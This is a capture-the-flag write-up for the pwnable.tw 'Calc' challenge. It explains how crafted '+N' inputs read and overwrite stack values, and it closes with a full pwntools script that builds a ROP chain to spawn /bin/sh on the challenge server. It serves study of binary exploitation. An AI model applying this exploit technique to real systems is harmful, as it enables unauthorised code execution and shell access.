# Calc
> LongChampion, 26/03/2020

## Hint
I can't solve this problem by myself, I have read some write-up for hint.  
I think you should read the following hints, then return to solve problem by yourself.
- enter `+360` will give you the value of `[$ebp]` (the value on the stack pointed to by `$ebp`).
- enter `+361+1` will increase the return address of function `calc` by 1.

In other word, you can leak and change any value on the stack by using the method above!

## Ideal
I use the hint and ROP technique to solve this problem.
Find all nessesary gadgets is too easy with [ROPgadget](https://github.com/JonathanSalwan/ROPgadget).
The biggest problem you may stuck in is how to get the address of string "/bin/sh":
* These is no string "/bin/sh" in the binary, so the only solution is write it on the stack.
* But, if you do this, you can't know the exact address of string "/bin/sh" on the stack.

After some Google-fu, I see the magic here: I can calculate `$ebp` of function `calc`.  
First, enter `+360` to get `[$ebp]`, this is the address of `$ebp` of function `main` on the stack.  
What is the relationship between `$ebp` and `[$ebp]`, look at the assembly:
```
08049452 <main>:
 8049452:	55                   	push   %ebp                            <-- save old $ebp on the stack
 8049453:	89 e5                	mov    %esp,%ebp                       <-- now $ebp = $esp
 8049455:	83 e4 f0             	and    $0xfffffff0,%esp
 8049458:	83 ec 10             	sub    $0x10,%esp
 804945b:	c7 44 24 04 34 94 04 	movl   $0x8049434,0x4(%esp)
 8049462:	08 
 8049463:	c7 04 24 0e 00 00 00 	movl   $0xe,(%esp)
 804946a:	e8 61 4e 00 00       	call   804e2d0 <__bsd_signal>
 804946f:	c7 04 24 3c 00 00 00 	movl   $0x3c,(%esp)
 8049476:	e8 f5 48 02 00       	call   806dd70 <alarm>
 804947b:	c7 04 24 1c f8 0b 08 	movl   $0x80bf81c,(%esp)
 8049482:	e8 39 70 00 00       	call   80504c0 <_IO_puts>
 8049487:	a1 c0 c4 0e 08       	mov    0x80ec4c0,%eax
 804948c:	89 04 24             	mov    %eax,(%esp)
 804948f:	e8 ec 6d 00 00       	call   8050280 <_IO_fflush>
 8049494:	e8 e0 fe ff ff       	call   8049379 <calc>                  <-- $ebp remain unchanged until here
```

In function `calc`:
```
08049379 <calc>:
 8049379:	55                   	push   %ebp                            <-- save $ebp on the stack, we can read this value
                                                                                   by send '+360' to the program!
 804937a:	89 e5                	mov    %esp,%ebp
```
Now, you know that you can have an address of one place on stack. If you are clever enough, you also know that can calculate the `$ebp` of `calc` by subtract the offset from `[$ebp]`. How to find the offset? Many ways available, but I use GDB for this mission. I found that the offset is 32.  
So `$ebp = [$ebp] - 32`. Have `$ebp`, you can calculate the base address of an array and many thing other.

## Final Solution
```python
#!/usr/bin/env python2

from pwn import *

r = remote("chall.pwnable.tw", 10100)
r.recvline()


def Get(i):
    r.sendline("+" + str(i))
    res = int(r.recvline())
    if res < 0:
        res += 0x100000000
    return res


def Set(i, v):
    old = Get(i)
    print "[%d] =" % i, old
    print "Target =", v

    diff = v - old
    if abs(diff) <= 0x7FFFFFFF:
        if diff < 0:
            r.sendline("+" + str(i) + "-" + str(-diff))
        else:
            r.sendline("+" + str(i) + "+" + str(diff))
    else:
        if diff < 0:
            diff += 0x100000000
            r.sendline("+" + str(i) + "+" + str(diff))
        else:
            diff = 0x100000000 - diff
            r.sendline("+" + str(i) + "-" + str(diff))

    new = int(r.recvline())
    if new < 0:
        new += 0x100000000

    if new == v:
        print "Status: OK!\n"
    else:
        print "Status: Error!\n"


prev_ebp = Get(360)
cur_ebp = prev_ebp - 32         # You need GDB to check this
ARR_BASE = cur_ebp - 4 * 360

bin_hex = u32("/bin")
sh_hex = u32("/sh\x00")
pop_eax = 0x0805c34b
pop_edx = 0x080701aa
pop_ecx_ebx = 0x080701d1
pop_int0x80 = 0x08049a21

# We will call execve("/bin/sh", NULL, NULL) by ROP
PAYLOAD = [pop_eax, 0xb, pop_edx, 0, pop_ecx_ebx,
           0, ARR_BASE + 369 * 4, pop_int0x80, bin_hex, sh_hex]

for i in range(len(PAYLOAD)):
    Set(361 + i, PAYLOAD[i])

r.sendline("Attack!")
r.interactive()
```
